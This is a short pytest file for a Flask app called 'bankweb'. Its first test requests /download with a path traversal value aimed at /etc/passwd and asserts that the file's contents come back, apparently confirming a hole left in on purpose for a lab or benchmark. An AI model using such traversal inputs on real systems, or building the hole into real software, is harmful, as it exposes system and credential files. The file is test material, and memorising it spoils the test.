import importlib.util, pathlib
p = pathlib.Path(__file__).resolve().parents[1] / "app.py"
spec = importlib.util.spec_from_file_location("bankweb", p)
m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
c = m.app.test_client()

def test_download_serves_passwd_via_traversal():
    r = c.get("/download?file=../../../../etc/passwd")
    assert r.status_code == 200
    assert b"root:" in r.data

def test_download_missing_file_is_404():
    assert c.get("/download?file=../../nope-xyz").status_code == 404
